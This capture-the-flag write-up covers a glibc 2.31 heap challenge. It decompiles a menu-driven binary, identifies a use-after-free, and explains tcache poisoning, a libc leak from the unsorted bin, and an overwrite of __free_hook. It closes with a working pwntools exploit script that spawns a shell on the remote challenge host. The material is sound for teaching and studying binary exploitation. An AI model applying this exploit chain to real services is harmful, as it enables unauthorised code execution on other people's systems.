## Introduction
In this challenge we are given a [zip archive]() that contains the binary, libc and ld.so. This is an excellent first heap challenge.

## Analysis
A simple `angr decompile` on the binary reveals the following `main` function:
```c
void main(void)
{
    unsigned long v3;  // fs
    unsigned int v0;  // [bp-0x14]
    unsigned long v1;  // [bp-0x10]

    v1 = *((long long *)(40 + v3));
    setvbuf(GLIBC_2.2.5::stdin, NULL, 2, 0);
    setvbuf(__bss_start, NULL, 2, 0);
    setvbuf(GLIBC_2.2.5::stderr, NULL, 2, 0);
    print_banner();
    puts("The Corroded Crown\n");
    printf("1. Forge\n2. Inscribe\n3. Inspect\n4. Destroy\n> ");
    while (1)
    {
        v0 = read_int();
        if (v0 != 4)
        {
            if (v0 > 4)
                break;
            if (v0 != 3)
            {
                if (v0 > 3)
                    break;
                if (v0 != 1)
                {
                    if (v0 != 2)
                        break;
                    inscribe_relic();
                }
                else
                {
                    forge_relic();
                }
            }
            else
            {
                inspect_relic();
            }
        }
        else
        {
            destroy_relic();
        }
        printf("\n1. Forge\n2. Inscribe\n3. Inspect\n4. Destroy\n> ");
    }
    fwrite("[ERROR] Invalid choice\n", 1, 23, GLIBC_2.2.5::stderr);
    exit(1312); /* do not return */
}
```

This appears to be a heap challenge, which is confirmed by looking at the subroutines:

```c
long long forge_relic(void)
{
    unsigned long v4;  // fs
    unsigned int v0;  // [bp-0x18]
    unsigned int v1;  // [bp-0x14]
    unsigned long v2;  // [bp-0x10]

    puts("\n[*] The forge roars to life. Molten memory takes shape...");
    printf("[?] Choose a shelf for the new relic (index): ");
    v0 = read_int();
    printf("[?] How much metal shall we shape? (size): ");
    v1 = read_int();
    if (v0 >= 0 && v0 <= 63)
    {
        if (v1 < 0)
        {
            fwrite("[ERROR] Invalid size\n", 1, 21, GLIBC_2.2.5::stderr);
            exit(1312); /* do not return */
        }
        if (!is_in_use[16 * v0])
        {
            (&relic)[2 * v0] = malloc(v1);
            (&g_404048)[4 * v0] = v1;
            is_in_use[16 * v0] = 1;
            printf("[+] The relic has been forged and placed upon shelf %d.\n", v0);
        }
        else
        {
            puts("[!] That shelf already holds a relic. The forge refuses.");
        }
        return v2 - *((long long *)(40 + v4));
    }
    fwrite("[ERROR] Invalid index\n", 1, 22, GLIBC_2.2.5::stderr);
    exit(1312); /* do not return */
}

```

`forge_relic` allocates a heap buffer of attacker-controlled size and places it at the chosen index.

```c
long long destroy_relic(void)
{
    unsigned long v3;  // fs
    unsigned int v0;  // [bp-0x14]
    unsigned long v1;  // [bp-0x10]

    puts("\n[*] The relic is cast into the furnace...");
    printf("[?] Which relic shall be destroyed? (index): ");
    v0 = read_int();
    if (v0 >= 0 && v0 <= 63)
    {
        if (is_in_use[16 * v0] == 0x1)
        {
            free(relic[2 * v0]);
            is_in_use[16 * v0] = 0;
            puts("[!] The relic crumbles to ash. The mark lingers.");
        }
        else
        {
            puts("[!] That shelf is empty. There is nothing to destroy.");
        }
        return v1 - *((long long *)(40 + v3));
    }
    fwrite("[ERROR] Invalid index\n", 1, 22, GLIBC_2.2.5::stderr);
    exit(1312); /* do not return */
}

```
`destroy_relic` frees a chosen relic if it is marked as existing, and marks the slot as empty wihout setting the pointer to zero.

```c
long long inspect_relic(void)
{
    unsigned long v3;  // fs
    unsigned int v0;  // [bp-0x14]
    unsigned long v1;  // [bp-0x10]

    puts("\n[*] You examine the relic's markings...");
    printf("[?] Which relic shall be inspected? (index): ");
    v0 = read_int();
    if (v0 >= 0 && v0 <= 63)
    {
        printf("[*] Relic [%d]: ", v0);
        write(1, relic[2 * v0], g_404048[4 * v0]);
        putchar(10);
        return v1 - *((long long *)(40 + v3));
    }
    fwrite("[ERROR] Invalid index\n", 1, 22, GLIBC_2.2.5::stderr);
    exit(1312); /* do not return */
}
```
`inspect_relic` writes the contents of the heap buffer without checking that the slot is marked as in use.

```c
long long inscribe_relic(void)
{
    unsigned long v3;  // fs
    unsigned int v0;  // [bp-0x14]
    unsigned long v1;  // [bp-0x10]

    puts("\n[*] You press the seal onto the relic's surface...");
    printf("[?] Which relic shall be inscribed? (index): ");
    v0 = read_int();
    if (v0 >= 0 && v0 <= 63)
    {
        printf("[?] Press your inscription into the metal (%d bytes):\n", g_404048[4 * v0]);
        if (read(0, relic[2 * v0], g_404048[4 * v0]))
        {
            puts("[+] The inscription has been pressed into the metal.");
            return v1 - *((long long *)(40 + v3));
        }
        _exit(0); /* do not return */
    }
    fwrite("[ERROR] Invalid index\n", 1, 22, GLIBC_2.2.5::stderr);
    exit(1312); /* do not return */
}
```
finally, `inscribe_relic` allows the user to write to the relic, yet again wihtout checking `in_use`.

## The Bug

When Freeing a relic, the program sets the `in_use[idx]` to zero, but it is not checked by the `inscribe_relic`  or the `inspect_relic` functions, allowing the user to trigger a Use-After-Free read or write


## Exploitation

Glibc versions are very important to look at when performing Heap exploits. In this instance, the code is running under glibc 2.31:
```bash
[init-freedom@artixlinux glibc]$ strings libc.so.6 | grep GNU
GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.17) stable release version 2.31.
Compiled by GNU CC version 9.4.0.
```

The glibc heap frees chunk to one of three structures:
the tcache, which is the easiest to exploit , has bins for every chunk
size from `0x20` to `0x400`, where size is rounded up to `0x10` bytes and.

## Arbitrary Write

Looking at the source code for Glibc 2.31 under `malloc/malloc.c`,  the
`__libc_malloc` (which is malloc) function shows the following:

```c
__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;

  _Static_assert (PTRDIFF_MAX <= SIZE_MAX / 2,
                  "PTRDIFF_MAX is not more than half of SIZE_MAX");

  void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook);
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0));
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  if (!checked_request2size (bytes, &tbytes))
    {
      __set_errno (ENOMEM);
      return NULL;
    }
  size_t tc_idx = csize2tidx (tbytes);

  MAYBE_INIT_TCACHE ();

  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx < mp_.tcache_bins
      && tcache
      && tcache->counts[tc_idx] > 0)
    {
      return tcache_get (tc_idx);
    }
  DIAG_POP_NEEDS_COMMENT;
#endif
// ...
```
and `tcache_get` which retrieves a chunk from the tcache, does this:

```c
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  e->key = NULL;
  return (void *) e;
}
```

in Glibc 2.31 `tcache_get` does not mangle the pointers, meaning we can write to them  without worrying about it.

We now have an arbitrary write primitive Via the tcache. However, to complete the exploit we lack an address leak and a function pointer to take control of the  program

## Glibc Leak

When freeing an object that is too big for the tcache, glibc places this object in the unsorted bin,
which is a doubly-linked list starting in glibc: This means the chunk will get a `bk` pointer pointing back to glibc,giving us a libc leak.


## __free_hook

Glibc contains a symbol named `__free_hook`. it holds a function pointer which is called every time something
gets freed.
```c
void
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0));
      return;
    }
```
as shown here, the pointer is given the chunks'memory as its first argument. we can therefore write
`system` to `__free_hook` and free a chunk containing the string `/bin/sh` to get a shell.

## Final exploit
Putting it all together, we get the following:
```python
from pwn import *
import heap_lib
context.terminal = ['alacritty','-e']
#target = gdb.debug("./corroded_crown")
target = remote('154.57.164.78',30827)
libc = ELF("./glibc/libc.so.6")
alloc = heap_lib.heap_func(b'1',target=target)
write = heap_lib.heap_func(b'2',target=target)
show = heap_lib.heap_func(b'3',target=target)
free = heap_lib.heap_func(b'4',target=target)

alloc(0,0x500)
alloc(1,0x40)
free(0)
show(0)
target.recvuntil(b'Relic [0]: ')
ptr = u64(target.recv(8))
libc.address = ptr - 0x1ecbe0
print(hex(libc.address))
alloc(0,0x500)
alloc(2,0x40)
alloc(3,0x40)
free(2)
free(1)
write(1,p64(libc.sym['__free_hook']))
alloc(4,0x40)
alloc(5,0x40)
write(5,p64(libc.sym['system']))
write(4,b'/bin/sh\x00')
free(4)
target.interactive()
```

